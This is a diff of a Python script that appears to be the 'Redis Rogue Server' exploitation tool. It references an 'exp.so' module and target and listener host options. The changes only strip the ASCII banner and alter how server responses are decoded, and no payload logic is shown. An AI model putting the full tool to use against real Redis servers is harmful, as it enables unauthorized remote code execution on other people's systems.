@@ -7,17 +7,6 @@ from optparse import OptionParser
 CRLF = "\r\n"
 SERVER_EXP_MOD_FILE = "exp.so"
 
-BANNER = """______         _ _      ______                         _____                          
-| ___ \       | (_)     | ___ \                       /  ___|                         
-| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ 
-|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
-| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   
-\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   
-                                     __/ |                                            
-                                    |___/                                             
-@copyright n0b0dy @ r3kapig
-"""
-
 def encode_cmd_arr(arr):
     cmd = ""
     cmd += "*" + str(len(arr))
@@ -52,7 +41,8 @@ def din(sock, cnt=4096):
             print(f"\033[1;34;40m[->]\033[0m {msg}")
         else:
             print(f"\033[1;34;40m[->]\033[0m {msg[:80]}......{msg[-80:]}")
-    return msg.decode('gb18030')
+    # Coding scheme defaults to UTF-8 if omitted
+    return msg.decode(errors='replace')
 
 def dout(sock, msg):
     global verbose
@@ -190,7 +180,6 @@ def runserver(rhost, rport, lhost, lport, passwd):
     cleanup(remote)
 
 if __name__ == '__main__':
-    print(BANNER)
     parser = OptionParser()
     parser.add_option("--rhost", dest="rh", type="string",
             help="target host", metavar="REMOTE_HOST")
